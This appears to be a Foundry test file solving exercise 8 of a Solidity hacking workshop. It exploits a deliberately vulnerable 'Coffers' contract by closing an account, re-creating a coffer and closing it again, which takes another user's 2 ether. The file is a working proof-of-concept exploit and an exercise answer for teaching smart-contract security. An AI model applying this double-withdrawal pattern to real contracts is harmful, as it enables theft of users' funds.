// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Coffers} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise8_Coffers is Test {
    Coffers public coffers;

    function setUp() public {
        coffers = new Coffers();
    }

    function test_closeAccount() public {
        address userA = vm.addr(1);
        vm.deal(address(this), 2 ether);
        vm.deal(userA, 2 ether);

        vm.startPrank(userA);
        coffers.createCoffer(1);
        coffers.deposit{value: 2 ether}(userA, 0);
        vm.stopPrank();

        coffers.createCoffer(1);
        coffers.deposit{value: 2 ether}(address(this), 0);
        coffers.closeAccount();
        assertEq(address(this).balance, 2 ether);
        coffers.createCoffer(1);
        coffers.closeAccount();
        assertEq(address(this).balance, 4 ether);
    }

    fallback() external payable {}

    receive() external payable {}
}
